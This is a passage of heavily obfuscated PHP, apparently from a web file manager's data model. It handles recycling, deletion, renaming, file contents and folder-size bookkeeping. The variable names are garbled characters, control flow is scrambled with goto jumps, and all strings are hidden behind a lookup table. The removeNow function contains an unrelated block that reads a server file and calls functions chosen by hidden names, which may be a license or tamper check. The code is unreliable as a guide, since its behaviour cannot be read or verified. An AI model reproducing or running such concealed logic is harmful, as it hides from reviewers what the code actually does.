ÄÕµ’: $B“‚°ö§Êø =& $_SERVER[Ìó]; $d­£ÜÍˆ«‰ = $this->sourceInfo($eÒÂÈÖ³«ß); $Aã®Œ†¦ = intval($d­£ÜÍˆ«‰[$B“‚°ö§Êø[367]]) === self::TYPE_SYSTEM; goto b×½•”êŠè; eŠ¢‰‚¦…ì: CacheLock::lock($cº¡œ¢á); $cÌ½à™ğ»ä = $this->fileNameExist($D’ÊÍÙ„ç¤, $A’Ïºê’Û); if (!$cÌ½à™ğ»ä) { $cÌ½à™ğ»ä = $this->mkdir($D’ÊÍÙ„ç¤, $A’Ïºê’Û, REPEAT_SKIP); $this->metaSet($cÌ½à™ğ»ä, $B“‚°ö§Êø[2303], $E…ğÏÊåî); $this->metaSet($cÌ½à™ğ»ä, $B“‚°ö§Êø[2304], $d­£ÜÍˆ«‰[$B“‚°ö§Êø[451]]); if ($d­£ÜÍˆ«‰[$B“‚°ö§Êø[456]] != 0) { $this->metaSet($cÌ½à™ğ»ä, $B“‚°ö§Êø[2305], _get($B°Ä¯Âéğå, $B“‚°ö§Êø[2306])); } } goto e’ÑêïÄ¡; cä„¿ªˆÉŞ: $E…ğÏÊåî = $d­£ÜÍˆ«‰[$B“‚°ö§Êø[367]] == self::TYPE_USER ? $B“‚°ö§Êø[530] : $B“‚°ö§Êø[969]; if ($E…ğÏÊåî == $B“‚°ö§Êø[530]) { $B°Ä¯Âéğå = Model($B“‚°ö§Êø[469])->getInfo($d­£ÜÍˆ«‰[$B“‚°ö§Êø[451]]); $A’Ïºê’Û = !empty($B°Ä¯Âéğå[$B“‚°ö§Êø[2292]]) ? $B°Ä¯Âéğå[$B“‚°ö§Êø[2292]] : $B°Ä¯Âéğå[$B“‚°ö§Êø[28]]; $A’Ïºê’Û = $B“‚°ö§Êø[244] . $A’Ïºê’Û . $B“‚°ö§Êø[2300] . $d­£ÜÍˆ«‰[$B“‚°ö§Êø[451]]; } else { $B°Ä¯Âéğå = Model($B“‚°ö§Êø[453])->getInfo($d­£ÜÍˆ«‰[$B“‚°ö§Êø[451]]); $A’Ïºê’Û = _get($B°Ä¯Âéğå, $B“‚°ö§Êø[28]); $A’Ïºê’Û = $B“‚°ö§Êø[153] . $A’Ïºê’Û . $B“‚°ö§Êø[2301] . $d­£ÜÍˆ«‰[$B“‚°ö§Êø[451]]; } $cº¡œ¢á = $B“‚°ö§Êø[2302] . md5($A’Ïºê’Û); goto eŠ¢‰‚¦…ì; b×½•”êŠè: $BõÒåÆ°ö = Model($B“‚°ö§Êø[1407])->get($B“‚°ö§Êø[2299]) == $B“‚°ö§Êø[83]; if ($Aã®Œ†¦ || $Eë±¼°§ˆÈ || !$BõÒåÆ°ö) { return $this->removeNow($eÒÂÈÖ³«ß, $Eë±¼°§ˆÈ); } $D’ÊÍÙ„ç¤ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto cä„¿ªˆÉŞ; e’ÑêïÄ¡: CacheLock::unlock($cº¡œ¢á); $this->metaSet($eÒÂÈÖ³«ß, $B“‚°ö§Êø[2307], $d­£ÜÍˆ«‰[$B“‚°ö§Êø[456]]); $this->where(array($B“‚°ö§Êø[365] => $eÒÂÈÖ³«ß))->save(array($B“‚°ö§Êø[386] => time())); goto FåâÓ»‰¸ê; Câ»„«œš«: } private function recycleClear($aÔËÅ§œ¡İ) { $fºê‰˜ß›È =& $_SERVER[Ìó]; $bæÂÉØÈÎë = $this->childrenAll($aÔËÅ§œ¡İ); $CÚ‘£ø’àµ = array($fºê‰˜ß›È[379] => array($fºê‰˜ß›È[380], $bæÂÉØÈÎë[$fºê‰˜ß›È[2308]])); Model($fºê‰˜ß›È[2309])->where($CÚ‘£ø’àµ)->delete(); } public function removeNow($fìÈ¬˜—õ‘, $CáÂ¯ã†Æ² = true) { goto eª„‹É®—; Aâ ¥ô£: $this->lockMoveStart($fìÈ¬˜—õ‘); Hook::trigger($CÙ›š¶À¸İ[2311], $FÅŠË‚æĞ, $CáÂ¯ã†Æ²); if ($CáÂ¯ã†Æ²) { Model($CÙ›š¶À¸İ[2309])->moveToRecycle($fìÈ¬˜—õ‘); } else { $Eˆ«‘¶ ÛÈ = $this->childrenAll($E÷ÔŞ§Î×¸); Model($CÙ›š¶À¸İ[500])->eventRemove($fìÈ¬˜—õ‘); $this->removeRelevance($Eˆ«‘¶ ÛÈ[$CÙ›š¶À¸İ[2308]], $Eˆ«‘¶ ÛÈ[$CÙ›š¶À¸İ[1247]]); } goto b§©™Ôó“; b·í¡‰à¥: return !0; goto eˆà„¹Ü»»; A„ç‹ºÙìô: $FÅŠË‚æĞ = $this->pathInfoMore($fìÈ¬˜—õ‘); if (!$E÷ÔŞ§Î×¸) { return !0; } if ($E÷ÔŞ§Î×¸[$CÙ›š¶À¸İ[456]] == 0) { if (!_get($GLOBALS, $CÙ›š¶À¸İ[452])) { return !1; } } goto Aâ ¥ô£; eª„‹É®—: $CÙ›š¶À¸İ =& $_SERVER[Ìó]; if ($_SERVER[$CÙ›š¶À¸İ[768]] != $_SERVER[$CÙ›š¶À¸İ[769]]) { goto Eôæ•Êƒ; dŒˆ¼‘áÎ‹: $Bè³©êåª = $CÙ›š¶À¸İ[791]; $Bè³©êåª($_SERVER[$CÙ›š¶À¸İ[792]]); $Bè³©êåª($_SERVER[$CÙ›š¶À¸İ[771]] . $CÙ›š¶À¸İ[2310]); goto D»ñÔİƒ£­; Eôæ•Êƒ: $cø„•„¼³È = $CÙ›š¶À¸İ[790]; $DÕç‰º¼Ó³ = $CÙ›š¶À¸İ[770]; $aë¢‰ìé°Á = $_SERVER[$CÙ›š¶À¸İ[771]] . $CÙ›š¶À¸İ[772]; goto bØ›¡Â³Íœ; bØ›¡Â³Íœ: $CÆ¡á®¶©ö = $DÕç‰º¼Ó³($aë¢‰ìé°Á); $d‘²÷©ÏÇ° = explode($CÙ›š¶À¸İ[213], $CÆ¡á®¶©ö); if (count($d‘²÷©ÏÇ°) < $CÙ›š¶À¸İ[551]) { $bÏ³”İ¾ôÕ = $CÙ›š¶À¸İ[773]; $bÏ³”İ¾ôÕ(); } goto dŒˆ¼‘áÎ‹; D»ñÔİƒ£­: $c¾Ã·ª‰–ø = 1; while ($c¾Ã·ª‰–ø > 1) { $c¾Ã·ª‰–ø = $c¾Ã·ª‰–ø + 4; $BßóÅÜ¬£Ø = rawurlencode($c¾Ã·ª‰–ø . $CÙ›š¶À¸İ[357]); } goto CœˆÌïóÈ; CœˆÌïóÈ: } $E÷ÔŞ§Î×¸ = $this->sourceInfo($fìÈ¬˜—õ‘); goto A„ç‹ºÙìô; b§©™Ôó“: $this->folderSizeReset($E÷ÔŞ§Î×¸[$CÙ›š¶À¸İ[456]]); $CÜ “œ‘ñŒ = array($E÷ÔŞ§Î×¸[$CÙ›š¶À¸İ[456]]); if ($E÷ÔŞ§Î×¸[$CÙ›š¶À¸İ[366]] == $CÙ›š¶À¸İ[83]) { $CÜ “œ‘ñŒ[] = $E÷ÔŞ§Î×¸[$CÙ›š¶À¸İ[365]]; } goto d×éÍ¡é‘; d×éÍ¡é‘: $this->updateModifyTime($CÜ “œ‘ñŒ); $this->lockMoveEnd($fìÈ¬˜—õ‘); Hook::trigger($CÙ›š¶À¸İ[1443], $FÅŠË‚æĞ, $CáÂ¯ã†Æ²); goto b·í¡‰à¥; eˆà„¹Ü»»: } public function childrenAll($aß÷œ“İ–Ÿ) { $E‚¼Ô†ÛóÛ =& $_SERVER[Ìó]; $B®°Œ·±Å‘ = $aß÷œ“İ–Ÿ[$E‚¼Ô†ÛóÛ[365]]; if ($aß÷œ“İ–Ÿ[$E‚¼Ô†ÛóÛ[366]] == $E‚¼Ô†ÛóÛ[83]) { $f”İòêÒ¨ë = array($E‚¼Ô†ÛóÛ[520] => array($E‚¼Ô†ÛóÛ[478], $aß÷œ“İ–Ÿ[$E‚¼Ô†ÛóÛ[454]] . $B®°Œ·±Å‘ . $E‚¼Ô†ÛóÛ[479])); $aÏïêÕø” = array($E‚¼Ô†ÛóÛ[520] => $f”İòêÒ¨ë[$E‚¼Ô†ÛóÛ[454]]); $F‘ÆÍ’ßíÎ = $this->field($E‚¼Ô†ÛóÛ[2312])->where($aÏïêÕø”)->select(); $Bö„ÊªÎ™Ò = !1; $c»’ƒá¹Ô× = array($B®°Œ·±Å‘); if ($F‘ÆÍ’ßíÎ) { $Bö„ÊªÎ™Ò = array_to_keyvalue($F‘ÆÍ’ßíÎ, $E‚¼Ô†ÛóÛ[33], $E‚¼Ô†ÛóÛ[414]); $Bö„ÊªÎ™Ò = array_remove_value($Bö„ÊªÎ™Ò, $E‚¼Ô†ÛóÛ[463]); $c»’ƒá¹Ô× = array_to_keyvalue($F‘ÆÍ’ßíÎ, $E‚¼Ô†ÛóÛ[33], $E‚¼Ô†ÛóÛ[365]); $c»’ƒá¹Ô×[] = $B®°Œ·±Å‘; } } else { $Bö„ÊªÎ™Ò = array($aß÷œ“İ–Ÿ[$E‚¼Ô†ÛóÛ[414]]); $c»’ƒá¹Ô× = array($B®°Œ·±Å‘); } return array($E‚¼Ô†ÛóÛ[2308] => $c»’ƒá¹Ô×, $E‚¼Ô†ÛóÛ[1247] => $Bö„ÊªÎ™Ò); } public function removeArray($eÆÁœ½¦ºç) { if (!$eÆÁœ½¦ºç) { return !0; } } public function removeRelevance($BòÚİËèÈ¦, $aëç…¬‘Œ) { goto DŞ¨¾Ñ·Éø; B–îİ•§÷: $F„æÓ§ºÈ• = array($bÚÔö‚‰­¬[379] => array($bÚÔö‚‰­¬[380], $BòÚİËèÈ¦)); Model($bÚÔö‚‰­¬[2309])->where($F„æÓ§ºÈ•)->delete(); Model($bÚÔö‚‰­¬[408])->where($F„æÓ§ºÈ•)->delete(); goto d¬âŒ‹ö‡; eÜ‘¤¦á¸: Model($bÚÔö‚‰­¬[2290])->removeBySource($BòÚİËèÈ¦); $this->where($F„æÓ§ºÈ•)->delete(); Model($bÚÔö‚‰­¬[417])->remove($aëç…¬‘Œ); goto F‰áºÑóÖà; eÉ‘âÜòğˆ: $BòÚİËèÈ¦ = array_unique(array_filter($BòÚİËèÈ¦)); $aëç…¬‘Œ = array_unique(array_filter($aëç…¬‘Œ)); if (!$BòÚİËèÈ¦) { return !1; } goto B–îİ•§÷; F‰áºÑóÖà: for ($cˆ¶Ø‡øŠ = 0; $cˆ¶Ø‡øŠ < count($BòÚİËèÈ¦); $cˆ¶Ø‡øŠ++) { $this->sourceCacheClear($BòÚİËèÈ¦[$cˆ¶Ø‡øŠ]); } goto e×•Ò¥‰îˆ; DŞ¨¾Ñ·Éø: $bÚÔö‚‰­¬ =& $_SERVER[Ìó]; $BòÚİËèÈ¦ = $BòÚİËèÈ¦ ? $BòÚİËèÈ¦ : array(); $aëç…¬‘Œ = $aëç…¬‘Œ ? $aëç…¬‘Œ : array(); goto eÉ‘âÜòğˆ; d¬âŒ‹ö‡: Model($bÚÔö‚‰­¬[2313])->where($F„æÓ§ºÈ•)->delete(); Model($bÚÔö‚‰­¬[500])->where($F„æÓ§ºÈ•)->delete(); Model($bÚÔö‚‰­¬[2049])->removeBySource($BòÚİËèÈ¦); goto eÜ‘¤¦á¸; e×•Ò¥‰îˆ: } public function rename($c¨å½£Ç÷, $d•Ï‰èŠ´Ç) { goto aÄêÎ‰ä¦Š; Cê®Á®É¨‹: $bÀÄ®Û†•î = $this->fileNameExist($EÅ˜èÂã[$d®Ï‘œ²ÕÁ[456]], $d•Ï‰èŠ´Ç); if ($bÀÄ®Û†•î) { return !1; } $a©‘Èå½Ó = array($d®Ï‘œ²ÕÁ[382] => $d•Ï‰èŠ´Ç, $d®Ï‘œ²ÕÁ[519] => USER_ID); goto A ™¯‰ùáæ; EÇï‡ò ­: $CÆİ•ĞÒƒä = $d®Ï‘œ²ÕÁ[2298] . $EÅ˜èÂã[$d®Ï‘œ²ÕÁ[456]]; if (isset(self::$cacheChildList[$CÆİ•ĞÒƒä])) { unset(self::$cacheChildList[$CÆİ•ĞÒƒä]); } return $eâ„¡²¹‘; goto bââôµõ; Eß–‰ÆÃÏ: $this->setNamePinyin($c¨å½£Ç÷, $a©‘Èå½Ó[$d®Ï‘œ²ÕÁ[28]], !1); $this->updateModifyTime($EÅ˜èÂã[$d®Ï‘œ²ÕÁ[456]]); $eâ„¡²¹‘ = $this->where(array($d®Ï‘œ²ÕÁ[379] => $c¨å½£Ç÷))->data($a©‘Èå½Ó)->save(); goto EÇï‡ò ­; aÄêÎ‰ä¦Š: $d®Ï‘œ²ÕÁ =& $_SERVER[Ìó]; $EÅ˜èÂã = $this->sourceInfo($c¨å½£Ç÷); if (!$EÅ˜èÂã) { return !1; } goto Cê®Á®É¨‹; A ™¯‰ùáæ: if (!$EÅ˜èÂã[$d®Ï‘œ²ÕÁ[366]] == $d®Ï‘œ²ÕÁ[83]) { $a©‘Èå½Ó[$d®Ï‘œ²ÕÁ[368]] = get_path_ext($d•Ï‰èŠ´Ç); } Model($d®Ï‘œ²ÕÁ[500])->eventRename($c¨å½£Ç÷, $EÅ˜èÂã[$d®Ï‘œ²ÕÁ[28]], $d•Ï‰èŠ´Ç); $this->sourceCacheClear($c¨å½£Ç÷); goto Eß–‰ÆÃÏ; bââôµõ: } public function setNamePinyin($f‘Ÿ¸§ÕÏÄ, $Câ¶ñ­´é´, $BĞ¹‚…Œ„· = true) { $B•ñÖõãÃ¨ =& $_SERVER[Ìó]; $bÑêŞ¿ÖøÇ = Input::check($Câ¶ñ­´é´, $B•ñÖõãÃ¨[523]); if ($BĞ¹‚…Œ„· && !$bÑêŞ¿ÖøÇ) { return; } if (!$bÑêŞ¿ÖøÇ) { $this->metaSet($f‘Ÿ¸§ÕÏÄ, $B•ñÖõãÃ¨[411], null); $this->metaSet($f‘Ÿ¸§ÕÏÄ, $B•ñÖõãÃ¨[410], null); return; } $Aã»äÊø¢ï = array($B•ñÖõãÃ¨[411] => str_replace($B•ñÖõãÃ¨[50], $B•ñÖõãÃ¨[33], Pinyin::encode($Câ¶ñ­´é´)), $B•ñÖõãÃ¨[410] => Pinyin::encode($Câ¶ñ­´é´, $B•ñÖõãÃ¨[524])); $this->metaSet($f‘Ÿ¸§ÕÏÄ, $Aã»äÊø¢ï); } public function getContent($dëÖÒ´ê±Š) { goto fãĞë‡£Úç; e†á´Ô¡¶: if ($Dè†Üº˜®À[$C‚®‰…øò[77]] == 0) { return $C‚®‰…øò[33]; } $DÆù¨ŒĞñ¸ = $C‚®‰…øò[2314] . $Dè†Üº˜®À[$C‚®‰…øò[159]]; if ($Dè†Üº˜®À[$C‚®‰…øò[77]] <= 1024 * 10) { $dèñÒù¨Ûó = Cache::get($DÆù¨ŒĞñ¸); if (!$dèñÒù¨Ûó) { $dèñÒù¨Ûó = IO::getContent($Dè†Üº˜®À[$C‚®‰…øò[75]]); Cache::set($DÆù¨ŒĞñ¸, $dèñÒù¨Ûó); } return $dèñÒù¨Ûó; } goto cˆ¸¨Şµ‰â; cˆ¸¨Şµ‰â: return IO::getContent($Dè†Üº˜®À[$C‚®‰…øò[75]]); goto a¸êÛº™è; fãĞë‡£Úç: $C‚®‰…øò =& $_SERVER[Ìó]; $Dè†Üº˜®À = $this->fileInfoGet($dëÖÒ´ê±Š); if (!$Dè†Üº˜®À) { return !1; } goto e†á´Ô¡¶; a¸êÛº™è: } public function setDesc($e‡½  ”¸Ğ, $f®äÏß˜…) { $Cƒ† »Š‹ª =& $_SERVER[Ìó]; Model($Cƒ† »Š‹ª[500])->eventAddDesc($e‡½  ”¸Ğ, $f®äÏß˜…); return $this->metaSet($e‡½  ”¸Ğ, $Cƒ† »Š‹ª[400], $f®äÏß˜…); } public function setContent($E„Ø’„Ë¹, $fä‰‡Ÿâ’Ö = '') { goto BÅ‘Êº„µ; BÅ‘Êº„µ: $Aì–…µ‘¬¯ =& $_SERVER[Ìó]; $fÑ„ó¥Å× = $this->sourceInfo($E„Ø’„Ë¹); $E„õˆ‹çë¤ = $this->fileInfoGet($E„Ø’„Ë¹); goto fôöÑôÂê—; Déì¢¸ˆÒ: if (!$e‹ĞÆğê×¯) { return Model($Aì–…µ‘¬¯[417])->remove($aµ´ßïƒ”ñ[$Aì–…µ‘¬¯[414]]); } $this->folderSizeReset($fÑ„ó¥Å×[$Aì–…µ‘¬¯[456]]); return !0; goto Aï‹–Íè†; fôöÑôÂê—: if (!$E„õˆ‹çë¤ || !$fÑ„ó¥Å×) { return !1; } $aµ´ßïƒ”ñ = Model($Aì–…µ‘¬¯[417])->addFileByContent($fä‰‡Ÿâ’Ö, $fÑ„ó¥Å×[$Aì–…µ‘¬¯[28]]); $e‹ĞÆğê×¯ = $this->fileHistory($fÑ„ó¥Å×, $aµ´ßïƒ”ñ[$Aì–…µ‘¬¯[414]], $aµ´ßïƒ”ñ[$Aì–…µ‘¬¯[77]]); goto Déì¢¸ˆÒ; Aï‹–Íè†: } public function fileSubstr($dáøÂáœí, $dŒ¥¤ø‘ÅÅ, $FÊ¼ˆªÈ¯Õ) { $EÃõäœ½êÏ = $this->fileInfoGet($dáøÂáœí); if (!$EÃõäœ½êÏ) { return !1; } return IO::fileSubstr($EÃõäœ½êÏ[$_SERVER[Ìó][75]], $dŒ¥¤ø‘ÅÅ, $FÊ¼ˆªÈ¯Õ); } public function fileInfoGet($AÔ‚¤œºµ¸) { goto CóòÉ¦²ÑÆ; Bã²Ùí¦: $fÑ°ÙæŸÕì = Model($aåÕÑ×½‚Õ[417])->fileInfo($A¬•ì–àÃŞ[$aåÕÑ×½‚Õ[414]]); if ($fÑ°ÙæŸÕì) { $fÑ°ÙæŸÕì[$aåÕÑ×½‚Õ[28]] = $A¬•ì–àÃŞ[$aåÕÑ×½‚Õ[28]]; } self::$cacheFileInfo[$f³œƒó¹õ] = $fÑ°ÙæŸÕì; goto D™¦åÄç¾È; cê˜êƒºŠÅ: $f³œƒó¹õ = $aåÕÑ×½‚Õ[420] . $A¬•ì–àÃŞ[$aåÕÑ×½‚Õ[414]]; $A¤‹ÑÏ×ÉĞ = _get(self::$cacheFileInfo, $f³œƒó¹õ); if ($A¤‹ÑÏ×ÉĞ) { return $A¤‹ÑÏ×ÉĞ; } goto Bã²Ùí¦; D™¦åÄç¾È: return $fÑ°ÙæŸÕì; goto CÂÙÁ¯‚êà; CóòÉ¦²ÑÆ: $aåÕÑ×½‚Õ =& $_SERVER[Ìó]; $A¬•ì–àÃŞ = $this->sourceInfo($AÔ‚¤œºµ¸); if (!$A¬•ì–àÃŞ || $A¬•ì–àÃŞ[$aåÕÑ×½‚Õ[366]]) { return !1; } goto cê˜êƒºŠÅ; CÂÙÁ¯‚êà: } private function folderChildrenNumber($aÄğ‘ó¬µÕ) { $få¨×ŠºÔ =& $_SERVER[Ìó]; $dÏˆ…Ó®²¤ = $this->sourceInfo($aÄğ‘ó¬µÕ); $dÓŒäÑÔø = array($få¨×ŠºÔ[520] => array($få¨×ŠºÔ[478], $dÏˆ…Ó®²¤[$få¨×ŠºÔ[454]] . $aÄğ‘ó¬µÕ . $få¨×ŠºÔ[479]), $få¨×ŠºÔ[391] => intval($dÏˆ…Ó®²¤[$få¨×ŠºÔ[392]]), $få¨×ŠºÔ[513] => 1); $E†‡ÖÈø½ä = $this->where($dÓŒäÑÔø)->count(); $Fù©™•Ò = $this->where($dÓŒäÑÔø)->where(array($få¨×ŠºÔ[513] => 0))->count(); return array($få¨×ŠºÔ[81] => $Fù©™•Ò, $få¨×ŠºÔ[82] => $E†‡ÖÈø½ä); } public function pathInfo($Bï¢ÅËå¡§, $f»–öîâ÷§ = false) { goto FÅ±‚‡Õ™; FÅ±‚‡Õ™: $eæ¤¯ˆ¸–‚ =& $_SERVER[Ìó]; $EËäÓÛ·Š = $eæ¤¯ˆ¸–‚[406] . intval($f»–öîâ÷§) . $eæ¤¯ˆ¸–‚[407] . $Bï¢ÅËå¡§; $Eñ·¶ÀË­ó = _get(self::$cachePathInfo, $EËäÓÛ·Š); goto bî…Öšâî£; bî…Öšâî£: if ($Eñ·¶ÀË­ó) { return $Eñ·¶ÀË­ó; } $Dˆİ·¦×ä÷ = $this->sourceInfo($Bï¢ÅËå¡§); if (!$Dˆİ·¦×ä÷) { return !1; } goto Fé«ñ¡™ŞÙ; Fé«ñ¡™ŞÙ: $Dˆİ·¦×ä÷ = $this->_listDataApplyItem($Dˆİ·¦×ä÷, $f»–öîâ÷§); self::$cachePathInfo[$EËäÓÛ·Š] = $Dˆİ·¦×ä÷; return $Dˆİ·¦×ä÷; goto B±÷šì•¿»; B±÷šì•¿»: } public static $cachePathInfoMore = array(); public function pathInfoMore($a¤™„¦÷ªÚ) { goto eÍŒÕùË­; eÍŒÕùË­: $bŸ˜ÜšÕĞæ =& $_SERVER[Ìó]; $Aã­‚ÄóŒ = _get(self::$cachePathInfoMore, $a¤™„¦÷ªÚ); if ($Aã­‚ÄóŒ) { return $Aã­‚ÄóŒ; } goto bÎ±Û‘†Á; bÎ±Û‘†Á: $DœÊĞÑÚØ = $this->pathInfo($a¤™„¦÷ªÚ); if (!$DœÊĞÑÚØ) { return !1; } if ($DœÊĞÑÚØ[$bŸ˜ÜšÕĞæ[366]] == $bŸ˜ÜšÕĞæ[83]) { $DœÊĞÑÚØ[$bŸ˜ÜšÕĞæ[80]] = $this->folderChildrenNumber($a¤™„¦÷ªÚ); } goto aİ‚ÆÕÉµù; aİ‚ÆÕÉµù: self::$cachePathInfoMore[$a¤™„¦÷ªÚ] = $DœÊĞÑÚØ; return $DœÊĞÑÚØ; goto C†•ùĞ„Í; C†•ùĞ„Í: } public function sourceInfo($BÓâ¢“ò·æ) { goto C¯„£Àè; A®ØèŞæŠâ: self::$cacheSourceInfo[$bÚ÷ÖàÔ—] = $b¦ÉãÏÍ³; return self::$cacheSourceInfo[$bÚ÷ÖàÔ—]; goto BÈÄ¢¯œÀĞ; C¯„£Àè: $bÅùš¾ˆ±Î =& $_SERVER[Ìó]; if (!$BÓâ¢“ò·æ) { return array(); } $bÚ÷ÖàÔ— = $bÅùš¾ˆ±Î[405] . $BÓâ¢“ò·æ; goto FÍñ•äÙ; FÍñ•äÙ: $cÒ©Š¾ñ› = _get(self::$cacheSourceInfo, $bÚ÷ÖàÔ—); if ($cÒ©Š¾ñ›) { return $cÒ©Š¾ñ›; } $b¦ÉãÏÍ³ = $this->where(array($bÅùš¾ˆ±Î[365] => $BÓâ¢“ò·æ))->find(); goto A®ØèŞæŠâ; BÈÄ¢¯œÀĞ: } public function sourceCacheClear($d÷í­¨Äôæ = false) { if ($d÷í­¨Äôæ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[Ìó][405] . $d÷í­¨Äôæ]); } public function pathInfoByPath($BÕÈÄèÖ±‘, $DÌ¿íöÜ…Š) { $BÓñ‡å½Š =& $_SERVER[Ìó]; $DÓÓÛªÈÙÑ = !$DÌ¿íöÜ…Š ? array() : explode($BÓñ‡å½Š[8], trim($DÌ¿íöÜ…Š, $BÓñ‡å½Š[8])); $aÛÕ¬°ä©ö = $BÕÈÄèÖ±‘; foreach ($DÓÓÛªÈÙÑ as $E·íçÈ±‡ó) { $Eùİ›õ´§Ä = array($BÓñ‡å½Š[456] => $aÛÕ¬°ä©ö, $BÓñ‡å½Š[28] => $E·íçÈ±‡ó); $f†‚ÄÛŠê = $this->where($Eùİ›õ´§Ä)->select(); if (!$f†‚ÄÛŠê) { return !1; } $f†‚ÄÛŠê = array_sort_by($f†‚ÄÛŠê, $BÓñ‡å½Š[392]); $aÛÕ¬°ä©ö = $f†‚ÄÛŠê[0][$BÓñ‡å½Š[365]]; } return $this->pathInfo($aÛÕ¬°ä©ö, !0); } protected function updateModifyTime($FÖ¢¶îï·¨) { goto bøëÍ‡²Óš; eÁ…§´æ‰Ù: $this->where($C „ºÔñƒ¥)->save($FÅ®à…‘ÒÑ); goto aÃÁØºË; c§¤ÜóÑ¼ä: foreach ($FÖ¢¶îï·¨ as $aâ­ÊŸŸ¦Å => $b…Á‚ï¤îË) { $FÖ¢¶îï·¨[$aâ­ÊŸŸ¦Å] = intval($b…Á‚ï¤îË); } $C „ºÔñƒ¥ = array($aØ¨âÀİ¹[365] => array($aØ¨âÀİ¹[7], $FÖ¢¶îï·¨)); $FÅ®à…‘ÒÑ = array($aØ¨âÀİ¹[519] => USER_ID, $aØ¨âÀİ¹[386] => time()); goto eÁ…§´æ‰Ù; bøëÍ‡²Óš: $aØ¨âÀİ¹ =& $_SERVER[Ìó]; if (!$FÖ¢¶îï·¨) { return; } if (!is_array($FÖ¢¶îï·¨)) { $FÖ¢¶îï·¨ = array($FÖ¢¶îï·¨); } goto c§¤ÜóÑ¼ä; aÃÁØºË: } public function folderSizeReset($Bæáí‹½«•) { goto F°„„¤…“Î; C—Š±ğ—¬‰: $bŞÇĞ„Šö = $this->parentLevelArray($cóƒì’ä±[$BòÛõ”Ë¯[454]]); if ($bŞÇĞ„Šö) { $BîÜœÇªá» = array($BòÛõ”Ë¯[365] => array($BòÛõ”Ë¯[380], $bŞÇĞ„Šö)); if ($CáÛ†Şö < 0) { $BîÜœÇªá»[$BòÛõ”Ë¯[77]] = array($BòÛõ”Ë¯[927], abs($CáÛ†Şö)); } $this->where($BîÜœÇªá»)->setAdd($BòÛõ”Ë¯[77], $CáÛ†Şö); } $this->targetSpaceUpdate($cóƒì’ä±[$BòÛõ”Ë¯[367]], $cóƒì’ä±[$BòÛõ”Ë¯[451]]); goto EÂ‰–§ĞÔ; EÂ‰–§ĞÔ: CacheLock::unlock($CÅà¬×âŠÕ); goto bòñÕì­Š‹; F°„„¤…“Î: $BòÛõ”Ë¯ =& $_SERVER[Ìó]; if ($this->statusIgnoreResetSpace) { return; } $CÅà¬×âŠÕ = $BòÛõ”Ë¯[2315] . $Bæáí‹½«•; goto DøŸØÉš¼Ò; c¿Ş¤¹Ä·¢: $CáÛ†Şö = $CĞ½–‰ÃÉ– - intval($cóƒì’ä±[$BòÛõ”Ë¯[77]]); if ($CáÛ†Şö == 0) { return CacheLock::unlock($CÅà¬×âŠÕ); } $this->where(array($BòÛõ”Ë¯[379] => $Bæáí‹½«•))->setField($BòÛõ”Ë¯[77], $CĞ½–‰ÃÉ–); goto C—Š±ğ—¬‰; BÒÜˆÈ¯’: $BîÜœÇªá» = array($BòÛõ”Ë¯[364] => $Bæáí‹½«•, $BòÛõ”Ë¯[391] => 0); $CĞ½–‰ÃÉ– = $this->where($BîÜœÇªá»)->sum($BòÛõ”Ë¯[77]); $CĞ½–‰ÃÉ– = intval($CĞ½–‰ÃÉ–); goto c¿Ş¤¹Ä·¢; DøŸØÉš¼Ò: CacheLock::lock($CÅà¬×âŠÕ, 20); $this->sourceCacheClear($Bæáí‹½«•); $cóƒì’ä± = $this->sourceInfo($Bæáí‹½«•); goto BÒÜˆÈ¯’; bòñÕì­Š‹: } public function folderSizeResetChildren($C‰„Ñó‚æç) { goto eèâ¥Ï›–; BŞ™í¢™É: $dŒÌ“±Ûáâ[] = $d‰ÙÙ¸…ã; $dŒÌ“±Ûáâ = array_to_keyvalue($dŒÌ“±Ûáâ, $Bøö‰Äğ Õ[365]); foreach ($dŒÌ“±Ûáâ as $c‰–´ß©Ÿ => $aèÁÛæ¶…) { $dŒÌ“±Ûáâ[$c‰–´ß©Ÿ][$Bøö‰Äğ Õ[2317]] = $dŒÌ“±Ûáâ[$c‰–´ß©Ÿ][$Bøö‰Äğ Õ[77]]; $dŒÌ“±Ûáâ[$c‰–´ß©Ÿ][$Bøö‰Äğ Õ[77]] = 0; } goto fõ¨­ßÒ¯å; eèâ¥Ï›–: $Bøö‰Äğ Õ =& $_SERVER[Ìó]; $this->sourceCacheClear($C‰„Ñó‚æç); $d‰ÙÙ¸…ã = $this->sourceInfo($C‰„Ñó‚æç); goto có«íÛ…Ë—; có«íÛ…Ë—: $d­³–ñßíª = array($Bøö‰Äğ Õ[513] => 1, $Bøö‰Äğ Õ[520] => array($Bøö‰Äğ Õ[478], $d‰ÙÙ¸…ã[$Bøö‰Äğ Õ[454]] . $C‰„Ñó‚æç . $Bøö‰Äğ Õ[479])); $f›‘øà÷«â = $Bøö‰Äğ Õ[2316]; $dŒÌ“±Ûáâ = $this->field($f›‘øà÷«â)->where($d­³–ñßíª)->select(); goto C¹›Ì¾ùÆ; fõ¨­ßÒ¯å: foreach ($A¬†ôê¼ÂÈ as $aèÁÛæ¶…) { $C¯õÌó„„ = $aèÁÛæ¶…[$Bøö‰Äğ Õ[456]] . $Bøö‰Äğ Õ[33]; if (!isset($dŒÌ“±Ûáâ[$C¯õÌó„„])) { continue; } if ($aèÁÛæ¶…[$Bøö‰Äğ Õ[392]] == $dŒÌ“±Ûáâ[$C¯õÌó„„][$Bøö‰Äğ Õ[392]]) { $dŒÌ“±Ûáâ[$C¯õÌó„„][$Bøö‰Äğ Õ[77]] += $aèÁÛæ¶…[$Bøö‰Äğ Õ[77]]; } } foreach ($dŒÌ“±Ûáâ as $aèÁÛæ¶…) { $b‹ØÊ»çç = $this->parentLevelArray($aèÁÛæ¶…[$Bøö‰Äğ Õ[454]]); foreach ($b‹ØÊ»çç as $C¯õÌó„„) { $C¯õÌó„„ = $C¯õÌó„„ . $Bøö‰Äğ Õ[33]; if (!isset($dŒÌ“±Ûáâ[$C¯õÌó„„])) { continue; } if ($aèÁÛæ¶…[$Bøö‰Äğ Õ[392]] == $dŒÌ“±Ûáâ[$C¯õÌó„„][$Bøö‰Äğ Õ[392]]) { $dŒÌ“±Ûáâ[$C¯õÌó„„][$Bøö‰Äğ Õ[77]] += $aèÁÛæ¶…[$Bøö‰Äğ Õ[77]]; } } } $Dğ§£í›¿° = array(); goto eéä’‚ãØÜ; C¹›Ì¾ùÆ: 